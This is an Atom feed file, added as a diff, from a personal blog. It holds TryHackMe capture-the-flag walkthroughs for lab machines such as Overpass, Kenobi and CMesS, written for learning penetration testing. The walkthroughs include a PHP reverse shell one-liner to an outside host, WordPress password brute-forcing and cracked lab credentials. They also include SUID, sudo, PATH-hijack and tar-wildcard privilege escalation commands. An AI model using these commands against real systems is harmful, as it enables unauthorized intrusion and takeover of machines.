@@ -1,0 +1,536 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-06-02T01:12:27+00:00</updated><id>/feed.xml</id><title type="html">Blog</title><subtitle>Saharsh Agrawal</subtitle><author><name>GitHub User</name></author><entry><title type="html">Advent Of Cyber 3 (2021)</title><link href="/CTF/adventofcyber3/" rel="alternate" type="text/html" title="Advent Of Cyber 3 (2021)" /><published>2021-12-01T00:00:00+00:00</published><updated>2021-12-01T00:00:00+00:00</updated><id>/CTF/Advent-of-Cyber-3-(2021)</id><content type="html" xml:base="/CTF/adventofcyber3/"><![CDATA[]]></content><author><name>GitHub User</name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">ColddBox:Easy WalkThrough</title><link href="/CTF/colddbox" rel="alternate" type="text/html" title="ColddBox:Easy WalkThrough" /><published>2021-05-18T00:00:00+00:00</published><updated>2021-05-18T00:00:00+00:00</updated><id>/CTF/colddbox</id><content type="html" xml:base="/CTF/colddbox"><![CDATA[<h1 id="colddboxeasy">ColddBox:Easy</h1>
+<h1><img src="/images/coldd/front.png" alt="front" /></h1>
+<p><a href="https://tryhackme.com/room/colddboxeasy">https://tryhackme.com/room/colddboxeasy</a></p>
+
+<h2 id="open-ports">Open Ports:</h2>
+<ul>
+  <li>9: discard</li>
+  <li>80: HTTP</li>
+</ul>
+
+<p><img src="/images/coldd/ports.png" alt="ports" /></p>
+
+<h2 id="gaining-access">Gaining Access:</h2>
+<ul>
+  <li>Found a wordpress website with version on <strong>nmap</strong> scan <code class="language-plaintext highlighter-rouge">4.1.31</code>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wpscan --url http://10.10.176.163  -e vp,vt,u       
+</code></pre></div>    </div>
+    <p><img src="/images/coldd/wp.png" alt="wp" /></p>
+  </li>
+  <li>Found anuthors/users:
+<img src="/images/coldd/users.png" alt="users" /></li>
+  <li>Hugo</li>
+  <li>C0ldd</li>
+  <li>
+    <p>Philip</p>
+  </li>
+  <li>Now performing password bruteforce for these 3 usernames
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wpscan --url  http://10.10.176.163 --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd,hugo,philip
+</code></pre></div>    </div>
+    <p><img src="/images/coldd/passwd.png" alt="passwd" /></p>
+  </li>
+  <li>Using this password we can login to /wp-admin</li>
+  <li>Go to appearance and editor, select <code class="language-plaintext highlighter-rouge">404 templet</code> to edit.</li>
+  <li>Paste the php revshell from pentestmonkey in the editor</li>
+  <li>Start the listener <code class="language-plaintext highlighter-rouge">nc</code></li>
+  <li>To execute the revsheel access: <code class="language-plaintext highlighter-rouge">http://ip/&gt;p=404.php</code></li>
+  <li>Unable to access usr.txt</li>
+  <li>Uploading linpeas.sh</li>
+  <li>Found suid set on <strong><em>find</em></strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ /usr/bin/find . -exec /bin/sh -p \; -quit
+</code></pre></div>    </div>
+  </li>
+  <li>Now we have root access.</li>
+</ul>
+
+<h3 id="user-flag">User Flag:</h3>
+<p><img src="/images/coldd/uflag.png" alt="uf" /></p>
+
+<h2 id="root-flag">Root Flag:</h2>
+<p><img src="/images/coldd/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[ColddBox:Easy https://tryhackme.com/room/colddboxeasy]]></summary></entry><entry><title type="html">Overpass WalkThrough</title><link href="/CTF/overpass" rel="alternate" type="text/html" title="Overpass WalkThrough" /><published>2021-05-15T00:00:00+00:00</published><updated>2021-05-15T00:00:00+00:00</updated><id>/CTF/overpass</id><content type="html" xml:base="/CTF/overpass"><![CDATA[<h1 id="overpass">Overpass</h1>
+<p><img src="/images/overpass/front.png" alt="front" />
+<a href="https://tryhackme.com/room/overpass">https://tryhackme.com/room/overpass</a></p>
+
+<h2 id="open-ports">Open ports:</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- 22: SSH
+- 80: HTTP ![ports](/images/overpass/ports.png)
+</code></pre></div></div>
+
+<h2 id="port-80">Port 80:</h2>
+<ul>
+  <li>starting Dirbuster:
+    <ul>
+      <li>found /admin
+        <ul>
+          <li>On futhur inspection found the response login.js code</li>
+          <li>On undserstating the code and simply changing the <em>cookies.set</em>
+            <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">Cookies</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">SessionToken</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Done</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div>            </div>
+            <p><img src="/images/overpass/cookieSet.png" alt="cookie" /></p>
+          </li>
+          <li>Now on reloading the page:
+  <img src="/images/overpass/onreload.png" alt="reload" /></li>
+          <li>we find the <strong>ssh key</strong> and save it on out pc.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="port-22">Port 22:</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 600 ssh_key
+</code></pre></div></div>
+<p><strong>Username:</strong> James</p>
+<ul>
+  <li>while logging in it is asking for passphrase</li>
+  <li>So, <strong>ssh2john</strong>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">john</span><span class="o">/</span><span class="n">ssh2john</span><span class="p">.</span><span class="n">py</span> <span class="n">ssh_key</span> <span class="o">&gt;</span> <span class="nb">hash</span><span class="p">.</span><span class="n">txt</span>
+ <span class="n">john</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlist</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="o">--</span><span class="nb">format</span><span class="o">=</span><span class="n">SSH</span> <span class="nb">hash</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>    </div>
+    <p><img src="/images/overpass/cracked.png" alt="cracked" /></p>
+  </li>
+  <li>found the passphrase: <strong>james13</strong></li>
+</ul>
+
+<h3 id="user-flag">User Flag:</h3>
+<p><img src="/images/overpass/uflag.png" alt="uflag" /></p>
+
+<h2 id="priviledge-escalation">Priviledge Escalation”</h2>
+<ul>
+  <li>on Looking at the files in out present dir:
+    <ul>
+      <li>found .overpass file with encrypted passwd
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ,LQ?2&gt;6QiQ$JDE6&gt;Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
+</code></pre></div>        </div>
+      </li>
+      <li>which encrytion is this?</li>
+      <li>Going to https://www.dcode.fr/cipher-identifier 
+  <img src="/images/overpass/efound.png" alt="efound" /></li>
+      <li>So it is likely to be ROT47</li>
+      <li>After decoding:
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  [{"name":"System","pass":"saydrawnlyingpicture"}]
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Uploading lineum.py….</li>
+  <li>[+]Starting linpeas.sh</li>
+  <li><strong>under crontab section found</strong>
+<img src="/images/overpass/cron.png" alt="cron" /></li>
+  <li><strong>Found /etc/hosts</strong> writable
+    <ul>
+      <li>change the overpass.thm ip to our <ip></ip></li>
+      <li>create dir <code class="language-plaintext highlighter-rouge">mkdir -p downloads/src/</code></li>
+      <li>create a <code class="language-plaintext highlighter-rouge">buildscript.sh</code> inside src folder</li>
+      <li>nano bashscript.sh
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  cat /root/root.txt &gt;&gt; /tmp/flag.txt
+</code></pre></div>        </div>
+      </li>
+      <li>inside victim :
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  touch /tmp/flag.txt
+</code></pre></div>        </div>
+      </li>
+      <li>Now go to www and start
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo python -m SimpleHTTPServer 80
+</code></pre></div>        </div>
+      </li>
+      <li>wait for the victim to connect to your http and run the <code class="language-plaintext highlighter-rouge">bashscript.sh</code></li>
+      <li>Go to victim machine <code class="language-plaintext highlighter-rouge">cat /tmp/flag.txt</code></li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="root-flag">Root Flag:</h3>
+<p><img src="/images/overpass/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Overpass https://tryhackme.com/room/overpass Open ports: - 22: SSH - 80: HTTP ![ports](/images/overpass/ports.png)]]></summary></entry><entry><title type="html">Charlie and The Chocolate Factory CTF WalkThrough</title><link href="/CTF/chocolate" rel="alternate" type="text/html" title="Charlie and The Chocolate Factory CTF WalkThrough" /><published>2021-01-17T00:00:00+00:00</published><updated>2021-01-17T00:00:00+00:00</updated><id>/CTF/Chocolate-factory-ctf</id><content type="html" xml:base="/CTF/chocolate"><![CDATA[<h1 id="charlie-and-the-chocolate-factory">Charlie and the Chocolate Factory</h1>
+<h1><img src="/images/chocolate/banner.png" alt="front" /></h1>
+<p><a href="https://tryhackme.com/room/chocolatefactory">https://tryhackme.com/room/chocolatefactory</a></p>
+
+<h2 id="open-ports">Open Ports:</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap  $IP
+</code></pre></div></div>
+
+<h2 id="netcat">netcat</h2>
+<p>netcat to all prots from 100 - 125</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc $IP 100
+nc $IP 113
+</code></pre></div></div>
+<ul>
+  <li>found a link in port <strong>113</strong> : http://localhost/key_rev_key</li>
+  <li>found a key file in link</li>
+  <li>Revers engineering the file
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings key
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="ftp">Ftp</h2>
+
+<ul>
+  <li>Anonymous login</li>
+  <li>found an image
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get gumroom.jpg
+</code></pre></div>    </div>
+  </li>
+  <li>extract the image
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extarct -sf gumroom.jpg
+</code></pre></div>    </div>
+  </li>
+  <li>found b64.txt which has base64 encoded text</li>
+  <li>
+    <p>decoding the text</p>
+  </li>
+  <li>user password shadow file found</li>
+  <li>crack the shadow file usig johnny</li>
+</ul>
+
+<h2 id="port-80">Port 80</h2>
+<ul>
+  <li>Enter the username: charlie</li>
+  <li>
+    <p>Enter the password found after cracking : cn7824</p>
+  </li>
+  <li>After login found a bar that executes os commands</li>
+  <li>Gaining reverse shell
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+</code></pre></div>    </div>
+  </li>
+  <li>start listner
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 1234
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p><strong>Now you have the access to the machine</strong></p>
+<ul>
+  <li>
+    <p>go to /home/charlie</p>
+  </li>
+  <li>You will find teleport file which is a id_rsa file(ssh-key)</li>
+  <li>copy the contents of the file to host machine</li>
+  <li>change the permission of the teleport file in the host machine
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 600 teleport
+ssh -i teleport charlie@ip
+</code></pre></div>    </div>
+    <h2 id="port-22">Port 22</h2>
+  </li>
+  <li>cd /home/charlie
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat uesr.txt
+</code></pre></div>    </div>
+  </li>
+  <li>see the permissions you have
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+</code></pre></div>    </div>
+  </li>
+  <li>permission to run <em>vi</em> as sudo
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi -c '!/bin/bash'
+</code></pre></div>    </div>
+  </li>
+  <li>now you are root
+    <h2 id="root">root</h2>
+  </li>
+  <li>go to /root
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python root.py
+</code></pre></div>    </div>
+  </li>
+  <li>Enter the key found after reversing</li>
+</ul>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Charlie and the Chocolate Factory https://tryhackme.com/room/chocolatefactory Open Ports: nmap $IP netcat netcat to all prots from 100 - 125 nc $IP 100 nc $IP 113 found a link in port 113 : http://localhost/key_rev_key found a key file in link Revers engineering the file strings key Ftp Anonymous login found an image get gumroom.jpg extract the image steghide extarct -sf gumroom.jpg found b64.txt which has base64 encoded text decoding the text user password shadow file found crack the shadow file usig johnny Port 80 Enter the username: charlie Enter the password found after cracking : cn7824 After login found a bar that executes os commands Gaining reverse shell php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' start listner nc -lvnp 1234 Now you have the access to the machine go to /home/charlie You will find teleport file which is a id_rsa file(ssh-key) copy the contents of the file to host machine change the permission of the teleport file in the host machine chmod 600 teleport ssh -i teleport charlie@ip Port 22 cd /home/charlie cat uesr.txt see the permissions you have sudo -l permission to run vi as sudo sudo vi -c '!/bin/bash' now you are root root go to /root python root.py Enter the key found after reversing]]></summary></entry><entry><title type="html">Kenobi WalkThrough</title><link href="/CTF/kenobi" rel="alternate" type="text/html" title="Kenobi WalkThrough" /><published>2020-07-04T00:00:00+00:00</published><updated>2020-07-04T00:00:00+00:00</updated><id>/CTF/kenobi</id><content type="html" xml:base="/CTF/kenobi"><![CDATA[<h1 id="anonymouos">Anonymouos</h1>
+<h1><img src="/images/kenobi/front.png" alt="front" /></h1>
+<p><a href="https://tryhackme.com/room/kenobi">https://tryhackme.com/room/kenobi</a>
+<img src="/images/kenobi/img.gif" height="90px" /></p>
+
+<h2 id="open-ports">Open Ports:</h2>
+<p><img src="/images/kenobi/ports.png" alt="PORTS" /></p>
+
+<h2 id="gaining-access">Gaining Access:</h2>
+<ol>
+  <li>Enumerating <code class="language-plaintext highlighter-rouge">SMB</code> using nmap script
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse ip
+</code></pre></div>    </div>
+    <ol>
+      <li>Found Anonymous login in smb</li>
+      <li>smbclinet //<ip>/Anonymous</ip></li>
+    </ol>
+  </li>
+  <li>Via ProFTPD 1.3.5
+    <ol>
+      <li>Found exploitdb copy</li>
+      <li>https://www.exploit-db.com/exploits/36742 (copying id_rsa to var/tmp)</li>
+    </ol>
+  </li>
+  <li>Mounting the /var/tmp to out pc
+    <ol>
+      <li>Make mount dir</li>
+      <li>Mkdir /mnt/kenobi</li>
+      <li>Mount ip:/var/tmp /mnt/kenobi</li>
+    </ol>
+  </li>
+  <li>now copy the shh key from var/tmp to ur desktop
+    <ol>
+      <li>Change permission</li>
+      <li>Chmod  600 key</li>
+    </ol>
+  </li>
+  <li>Connect via ssh
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Ssh -i key kenobi@ip
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="user-flag">User Flag:</h3>
+<p><img src="/images/kenobi/flag.png" alt="flag" /></p>
+
+<h2 id="priviledge-escalation">Priviledge Escalation:</h2>
+<ol>
+  <li>Looking into SUID bit
+Ø Find / -perm -u=s 2&gt; /dev/null <br />
+ ○ Found menu<br />
+ ○ Strings menu<br />
+     § Found the no path was specified for curl command <br /></li>
+  <li>Now <br />
+Ø Echo ‘cp /bin/bash /tmp/bash;chmod +s /tmp/bash’ &gt; curl<br />
+Ø Chmod 777 curl<br />
+Ø Export PATH=/tmp:$PATH<br />
+Ø /usr/bin/menu and press 1<br />
+Ø Bash -p<br /></li>
+</ol>
+
+<h3 id="root-flag">Root Flag:</h3>
+<p><img src="/images/kenobi/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Anonymouos https://tryhackme.com/room/kenobi]]></summary></entry><entry><title type="html">Anonymous WalkThrough</title><link href="/CTF/anonymous" rel="alternate" type="text/html" title="Anonymous WalkThrough" /><published>2020-06-29T00:00:00+00:00</published><updated>2020-06-29T00:00:00+00:00</updated><id>/CTF/anonymous</id><content type="html" xml:base="/CTF/anonymous"><![CDATA[<h1 id="anonymouos">Anonymouos</h1>
+<h1><img src="/images/Anonymous/front.png" alt="front" /></h1>
+<p><a href="https://tryhackme.com/room/anonymous">https://tryhackme.com/room/anonymous</a></p>
+
+<h2 id="open-ports">Open Ports:</h2>
+<ul>
+  <li>21: FTP</li>
+  <li>22: SSH</li>
+  <li>139: NETBIOS-SSN</li>
+  <li>445: MICROSOFT-DS</li>
+</ul>
+
+<p><img src="/images/Anonymous/ports.png" alt="ports" /></p>
+
+<h2 id="gaining-access">Gaining Access:</h2>
+<ol>
+  <li>In port 21[FTP] <strong>Anonymous login</strong> is <em>allowed</em><br />
+  i. Go to scripts<br /> 
+  ii. Modify <code class="language-plaintext highlighter-rouge">clean.sh</code> to get revershell<br />
+  iii. Wait for a min<br />
+<strong>U will now have the reverse shell in you <code class="language-plaintext highlighter-rouge">netcat</code></strong></li>
+</ol>
+
+<h3 id="user-flag">User Flag:</h3>
+<h5 id="90d6f992585815ff991e68748c414740"><a href="">90d6f992585815ff991e68748c414740</a></h5>
+
+<h2 id="priviledge-escaltion">Priviledge Escaltion:</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt;/dev/null
+</code></pre></div></div>
+<ul>
+  <li>found <code class="language-plaintext highlighter-rouge">env</code> vuln found via GTFObins</li>
+  <li><code class="language-plaintext highlighter-rouge">./env/bin/bash -p</code></li>
+</ul>
+
+<h3 id="root-flag">Root Flag:</h3>
+<p><img src="/images/Anonymous/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Anonymouos https://tryhackme.com/room/anonymous]]></summary></entry><entry><title type="html">CMesS WalkThrough</title><link href="/CTF/cmess" rel="alternate" type="text/html" title="CMesS WalkThrough" /><published>2020-06-27T00:00:00+00:00</published><updated>2020-06-27T00:00:00+00:00</updated><id>/CTF/cmess</id><content type="html" xml:base="/CTF/cmess"><![CDATA[<h1 id="cmess">CMesS</h1>
+<h1><img src="/images/cmess/front.png" alt="front" /></h1>
+<p><a href="https://tryhackme.com/room/cmess">https://tryhackme.com/room/cmess</a></p>
+
+<p><strong>Add ipi cmess.th to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></strong></p>
+<h2 id="open-ports">Open Ports:</h2>
+<ul>
+  <li>22- SSH</li>
+  <li>80- HTTP</li>
+</ul>
+
+<p><img src="/images/cmess/ports.png" alt="ports" /></p>
+
+<h2 id="gaining-access">Gaining Access:</h2>
+<h3 id="port-80-">Port 80-</h3>
+<ol>
+  <li>Do <code class="language-plaintext highlighter-rouge">wfuzz</code> <em>for subdomain enum</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -f sub-fighter -w /usr/share/wfuzz/wordlist/top5000 -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm"
+</code></pre></div>    </div>
+    <p><strong>To sort the output</strong></p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -f sub-fighter -w /usr/share/wfuzz/wordlist/top5000 -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm" --hw 290
+</code></pre></div>    </div>
+    <p><img src="/images/cmess/wfuzz.png" alt="wfuzz" /></p>
+  </li>
+  <li>Add ip dev.cmess.thm to /etc/hots <br />
+ a. Find email<br /> 
+ 	b. Password</li>
+  <li>Do dirb <br />
+ a. Found ip/admin page</li>
+  <li>login <br />
+ 	a. Go to content / file / upload <br />
+ 	b. upload</li>
+  <li>go to ip/assests/php-rev</li>
+  <li>Upload linEum.sh<br />
+ a. Found /opt/password.bak<br />
+<img src="/images/cmess/bak.png" alt="bak" /></li>
+</ol>
+
+<h3 id="user-flag">User Flag:</h3>
+<p><img src="/images/cmess/flag.png" alt="flag" /></p>
+
+<h2 id="priviledge-escalation">Priviledge Escalation</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/crontab
+</code></pre></div></div>
+<p><img src="/images/cmess/cron.png" alt="cron" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/andru/shell.sh
+Chmod +x  shell.sh
+</code></pre></div></div>
+<p><strong>Tar specific commands:</strong></p>
+<ul>
+  <li>Touch /home/user/–checkpoint=1</li>
+  <li>Touch /home/user/–checkpoint-action=exec=sh\shell.sh
+ <strong><em>wait for min</em></strong></li>
+  <li>/tmp/bash -p</li>
+</ul>
+
+<h3 id="root-flag">ROOT Flag:</h3>
+<p><img src="/images/cmess/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[CMesS https://tryhackme.com/room/cmess]]></summary></entry><entry><title type="html">Simple CTF WalkThrough</title><link href="/CTF/simplectf" rel="alternate" type="text/html" title="Simple CTF WalkThrough" /><published>2020-06-26T00:00:00+00:00</published><updated>2020-06-26T00:00:00+00:00</updated><id>/CTF/simple-CTF</id><content type="html" xml:base="/CTF/simplectf"><![CDATA[<h1 id="simple-ctf">Simple CTF</h1>
+<h1><img src="/images/simplectf/front.png" alt="front" /></h1>
+<p><a href="https://tryhackme.com/room/easyctf">https://tryhackme.com/room/easyctf</a></p>
+
+<h2 id="open-ports">Open Ports:</h2>
+<ul>
+  <li>21: FTP</li>
+  <li>80: HTTP</li>
+  <li>2222: EtherNetIP-1</li>
+</ul>
+
+<p><img src="/images/simplectf/port.png" alt="ports" /></p>
+
+<h2 id="port-21">Port 21:</h2>
+<ul>
+  <li><strong>found name <code class="language-plaintext highlighter-rouge">mitch</code></strong></li>
+</ul>
+
+<h2 id="port-80">Port 80:</h2>
+<p><strong><em>Drib</em>:</strong></p>
+<ol>
+  <li>found a page in <code class="language-plaintext highlighter-rouge">/simple</code>
+ a. CMS made simple exploit found in exploitdb
+     i. Found username: <strong>mitch</strong>
+     ii. Foudn pass: <strong>secret</strong></li>
+  <li>New using ssh to get into the machine</li>
+</ol>
+
+<h3 id="user-flag">User Flag:</h3>
+<p><img src="/images/simplectf/uflag.png" alt="user flag" /></p>
+
+<h2 id="priviledge-escalation">Priviledge Escalation</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+</code></pre></div></div>
+<p><img src="/images/simplectf/sudo.png" alt="sudo" /></p>
+
+<h3 id="root-flag">Root Flag:</h3>
+<p><img src="/images/simplectf/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Simple CTF https://tryhackme.com/room/easyctf]]></summary></entry><entry><title type="html">Vulnversity WalkThrough</title><link href="/CTF/vulnversity" rel="alternate" type="text/html" title="Vulnversity WalkThrough" /><published>2020-06-26T00:00:00+00:00</published><updated>2020-06-26T00:00:00+00:00</updated><id>/CTF/vulnversity</id><content type="html" xml:base="/CTF/vulnversity"><![CDATA[<h1 id="vulnversity">Vulnversity</h1>
+<h1><img src="/images/vulnversity/front.png" alt="front" /></h1>
+<p><a href="https://tryhackme.com/room/vulnversity">https://tryhackme.com/room/vulnversity</a></p>
+
+<h2 id="open-ports">Open Ports:</h2>
+<ul>
+  <li>21- FTP</li>
+  <li>22- SSH</li>
+  <li>139- NETBIOS-SSN</li>
+  <li>445- MICROSOFT-DS</li>
+  <li>3128- SQUID-HTTP</li>
+  <li>3333- DEC-NOTES</li>
+</ul>
+
+<p><img src="/images/vulnversity/ports.png" alt="ports" /></p>
+
+<h2 id="gaining-access">Gaining Access:</h2>
+<h3 id="port-80-">Port 80-</h3>
+<ol>
+  <li>Running dir bruteforce and found:
+<img src="/images/vulnversity/internal.png" alt="internal" /></li>
+  <li><code class="language-plaintext highlighter-rouge">.phtml</code> file allowed to upload</li>
+  <li>Upload revershell
+    <ol>
+      <li>Ip/internal/uploads/rev.phtml <code class="language-plaintext highlighter-rouge">this will exec the rev-shell file</code></li>
+    </ol>
+  </li>
+</ol>
+
+<h3 id="user-flag">User Flag:</h3>
+<p><img src="/images/vulnversity/flag.png" alt="flag" /></p>
+
+<h2 id="privelege-escalation">Privelege Escalation:</h2>
+<ul>
+  <li>tty the shell
+    <blockquote>
+      <p>Find / -perm -u=s type f 2&gt; /dev/null</p>
+    </blockquote>
+  </li>
+  <li>found bin/systemctl
+<img src="/images/vulnversity/ctl.png" alt="ctl" />
+    <blockquote>
+      <p>change id to cat root/root.png</p>
+    </blockquote>
+  </li>
+</ul>
+
+<h3 id="root-flag">Root Flag:</h3>
+<p><img src="/images/vulnversity/root.png" alt="root" /></p>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Vulnversity https://tryhackme.com/room/vulnversity]]></summary></entry><entry><title type="html">Anthem WalkThrough</title><link href="/CTF/anthem" rel="alternate" type="text/html" title="Anthem WalkThrough" /><published>2020-06-20T00:00:00+00:00</published><updated>2020-06-20T00:00:00+00:00</updated><id>/CTF/anthem</id><content type="html" xml:base="/CTF/anthem"><![CDATA[<h1 id="anthem">Anthem</h1>
+<p><img src="/images/anthem/front.png" alt="front" />
+<a href="https://tryhackme.com/room/anthem">https://tryhackme.com/room/anthem</a></p>
+
+<h2 id="open-ports">Open Ports:</h2>
+<ul>
+  <li>80:	http</li>
+  <li>135:	msrpc</li>
+  <li>139: netbios-ssn</li>
+  <li>445: microsoft-ds</li>
+  <li>3389: ms-wbt-server
+ <img src="/images/anthem/ports.png" alt="ports" /></li>
+</ul>
+
+<h2 id="gaining-access">Gaining Access:</h2>
+<ol>
+  <li>
+    <p>Found <strong>Admin</strong> name from the <code class="language-plaintext highlighter-rouge">poem</code> via google
+  a. hence username: <strong>sg</strong>
+  b. Password: inside <code class="language-plaintext highlighter-rouge">/robots.txt</code>
+  	<img src="/images/anthem/robots.png" alt="robots" /></p>
+  </li>
+  <li>
+    <p>Connecting to machine:
+<img src="/images/anthem/rdp.png" alt="rdesktop" /></p>
+  </li>
+</ol>
+
+<h3 id="user-flag">User Flag:</h3>
+<p><img src="/images/anthem/uflag.png" alt="uflag" /></p>
+
+<h2 id="priviledge-escalation">Priviledge Escalation:</h2>
+<ol>
+  <li>
+    <p>Do view hidden files
+ a. Under <code class="language-plaintext highlighter-rouge">C:\</code> in backup</p>
+
+    <p>b. Add permission to restore file</p>
+
+    <p>c. Inside restore file we find the passowrd to the <strong>Administrator</strong><br />
+     <img src="/images/anthem/passwd.png" alt="passwd" /></p>
+  </li>
+  <li>
+    <p>Moving to Admin
+ a. Desktop &gt;</p>
+  </li>
+</ol>
+
+<h3 id="root-flag">Root Flag:</h3>
+<p><img src="/images/anthem/root.png" alt="root" /></p>
+
+<h2 id="miscellaneous-flags">Miscellaneous Flags:</h2>
+<ol>
+  <li>1st flag:
+ <img src="/images/anthem/1st.png" alt="1st" /></li>
+  <li>2nd flag:
+ <img src="/images/anthem/2nd.png" alt="2nd" /></li>
+  <li>3rd flag:
+ <img src="/images/anthem/3rd.png" alt="3rd" /></li>
+  <li>4th flag:
+ <img src="/images/anthem/4th.png" alt="4th" /></li>
+</ol>]]></content><author><name>GitHub User</name></author><category term="TryHackMe" /><summary type="html"><![CDATA[Anthem https://tryhackme.com/room/anthem]]></summary></entry></feed>
